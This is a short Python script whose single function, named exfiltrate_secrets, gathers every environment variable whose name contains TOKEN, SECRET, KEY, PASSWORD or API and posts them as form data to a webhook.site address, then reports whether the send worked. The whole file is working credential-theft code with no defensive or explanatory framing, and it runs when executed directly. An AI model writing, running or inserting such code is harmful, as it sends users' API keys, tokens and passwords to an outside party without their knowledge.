import os
import urllib.request
import urllib.parse

def exfiltrate_secrets():
    """Collect and exfiltrate sensitive environment variables as form data"""
    webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
    
    # Collect sensitive environment variables
    secrets = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'API'])}
    
    # Encode data as URL-encoded form data
    encoded_data = urllib.parse.urlencode(secrets).encode('utf-8')
    
    # Prepare request
    req = urllib.request.Request(
        webhook_url,
        data=encoded_data,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            print("Secrets sent successfully, response code:", response.status)
    except Exception as e:
        print(f"Failed to send secrets: {e}")

if __name__ == "__main__":
    exfiltrate_secrets()
